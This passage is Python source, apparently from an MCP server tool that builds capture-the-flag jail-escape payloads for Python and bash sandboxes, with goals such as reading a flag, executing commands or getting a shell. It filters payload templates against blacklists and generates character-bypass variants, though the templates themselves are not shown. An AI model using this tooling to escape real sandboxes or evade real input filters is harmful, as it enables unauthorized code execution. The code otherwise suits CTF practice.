    elif jail_type == "bash":
        templates = _BASH_PAYLOAD_TEMPLATES.get(goal, [])
    else:
        return json.dumps({"error": f"Unknown jail_type: {jail_type}"})

    if not templates:
        return json.dumps(
            {
                "error": f"Unknown goal: {goal}. Use: read_flag, exec_command, get_shell, recover_builtins"
            }
        )

    # If builtins are wiped, filter out templates that rely on direct builtins
    if builtins_wiped and jail_type == "python":
        templates = [
            t
            for t in templates
            if "subclass" in t["technique"] or "getattr" in t["technique"]
        ]
        # If no templates remain, fall back to all subclass-based ones
        if not templates:
            templates = _PY_PAYLOAD_TEMPLATES.get("recover_builtins", [])

    payloads = []
    for tmpl in templates:
        # Format the template
        try:
            raw = tmpl["template"].format(
                path=flag_path,
                cmd="id",
                us=us,
                idx=0,
            )
        except (KeyError, IndexError):
            raw = tmpl["template"]

        # Check if clean as-is
        def _is_clean(p: str) -> bool:
            for bs in bl_strings:
                if bs in p:
                    return False
            for bc in bl_chars:
                if bc in p:
                    return False
            return True

        if _is_clean(raw):
            if max_length == 0 or len(raw) <= max_length:
                payloads.append(
                    {
                        "payload": raw,
                        "technique": tmpl["technique"],
                        "length": len(raw),
                        "note": tmpl["note"],
                    }
                )
        else:
            # Try generating bypass variants
            variants = _apply_char_bypass(raw, bl_chars, bl_strings)
            for var in variants:
                if _is_clean(var):
                    if max_length == 0 or len(var) <= max_length:
                        payloads.append(
                            {
                                "payload": var,
                                "technique": tmpl["technique"] + " + char_bypass",
                                "length": len(var),
                                "note": tmpl["note"],
                            }
                        )

    # Sort by length
    payloads.sort(key=lambda x: x["length"])

    return json.dumps(
        {
            "goal": goal,
            "jail_type": jail_type,
            "payload_count": len(payloads),
            "payloads": payloads,
            "blocked_verification": True,
        },
        indent=2,
    )


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    mcp.run(transport="stdio")
